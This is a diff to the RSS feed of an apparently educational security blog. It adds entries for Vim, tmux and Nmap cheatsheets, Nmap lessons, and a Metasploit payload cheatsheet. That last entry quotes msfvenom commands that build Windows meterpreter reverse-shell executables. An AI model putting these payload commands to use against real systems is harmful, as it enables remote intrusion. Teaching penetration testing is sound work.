@@ -7,10 +7,77 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>anir0y</copyright>
-    <lastBuildDate>Mon, 01 Jul 2019 17:19:45 +0530</lastBuildDate>
+    <lastBuildDate>Mon, 01 Jul 2019 18:33:42 +0530</lastBuildDate>
     
 	<atom:link href="/class/blog/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Cheatsheet Msfpaylods</title>
+      <link>/class/blog/cheatsheet-msfpaylods/</link>
+      <pubDate>Mon, 01 Jul 2019 18:33:42 +0530</pubDate>
+      
+      <guid>/class/blog/cheatsheet-msfpaylods/</guid>
+      <description>Most Common Payloads Binaries    Command Info     msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe &amp;gt; example.exe Creates a simple TCP Payload for Windows   msfvenom -p windows/meterpreter/reverse_http LHOST=(Your IP/DNS) LPORT=(Your Port) -f exe &amp;gt; example.</description>
+    </item>
+    
+    <item>
+      <title>Cheatsheet Vim</title>
+      <link>/class/blog/cheatsheet-vim/</link>
+      <pubDate>Mon, 01 Jul 2019 18:28:27 +0530</pubDate>
+      
+      <guid>/class/blog/cheatsheet-vim/</guid>
+      <description>Vim is a CLI text editor. and here we have some usefull commands.
+ Modes and Basic movement vim - shows info about vim default mode is command mode j/k/h/l - navigation i - insert mode esc - go back to command mode  Faster Movement w - jump from word to word W - move whole word b - go back to word B - back to whole word A - append at the end of line $ - go to end of line ^ - go to first non space char of line 0 - go to very beginning of line gg - begining of file G - go to end of file } - jump to next paragraph { - back to paragraph f* - will find the first occurance of * in the line F* - find backwords the * char t* - till the occurence of * T* - backward occurence of * 8gg - 8th line 8G - 8th line :8 - go to 8th line ; - repeat the last search , - repeat last search on opposite direction  Basic Editing :e ~/.</description>
+    </item>
+    
+    <item>
+      <title>Tmux Cheatsheet</title>
+      <link>/class/blog/tmux-cheatsheet/</link>
+      <pubDate>Mon, 01 Jul 2019 18:20:27 +0530</pubDate>
+      
+      <guid>/class/blog/tmux-cheatsheet/</guid>
+      <description>start new:
+tmux  start new with session name:
+tmux new -s myname  attach:
+tmux a # (or at, or attach)  attach to named:</description>
+    </item>
+    
+    <item>
+      <title>Nmap Cheatsheet</title>
+      <link>/class/blog/nmap-cheatsheet/</link>
+      <pubDate>Mon, 01 Jul 2019 18:09:53 +0530</pubDate>
+      
+      <guid>/class/blog/nmap-cheatsheet/</guid>
+      <description>Target Specification    Switch Example Description      nmap 192.168.1.1 Scan a single IP    nmap 192.168.1.1 192.</description>
+    </item>
+    
+    <item>
+      <title>Nmap Os Fingerprinting</title>
+      <link>/class/blog/nmap-os-fingerprinting/</link>
+      <pubDate>Mon, 01 Jul 2019 17:56:35 +0530</pubDate>
+      
+      <guid>/class/blog/nmap-os-fingerprinting/</guid>
+      <description>Lesson 2  What is OS fingerprinting? OS fingerprinting is the process of differentiating the OS used by a host in a network. There can be different implementations in determining this like obtaining the TCP/IP stack (TTL value defaults), HTTP packets (via User-Agent field), via ICMP requests, open port patterns, TCP window size and more.</description>
+    </item>
+    
+    <item>
+      <title>Nmap Smtp</title>
+      <link>/class/blog/nmap-smtp/</link>
+      <pubDate>Mon, 01 Jul 2019 17:56:24 +0530</pubDate>
+      
+      <guid>/class/blog/nmap-smtp/</guid>
+      <description>Lesson 3  What is SMTP SMTP stands for Simple Mail Transfer Protocol and is used for email delivery from an email client to an email server.</description>
+    </item>
+    
+    <item>
+      <title>Nmap Intro</title>
+      <link>/class/blog/nmap-intro/</link>
+      <pubDate>Mon, 01 Jul 2019 17:56:16 +0530</pubDate>
+      
+      <guid>/class/blog/nmap-intro/</guid>
+      <description>Lesson 1  Introduction Nmap (&amp;ldquo;Network Mapper&amp;rdquo;) is a free and open source (license) utility for network discovery and security auditing. Many systems and network administrators also find it useful for tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime.</description>
+    </item>
     
     <item>
       <title>Spawn Shell</title>
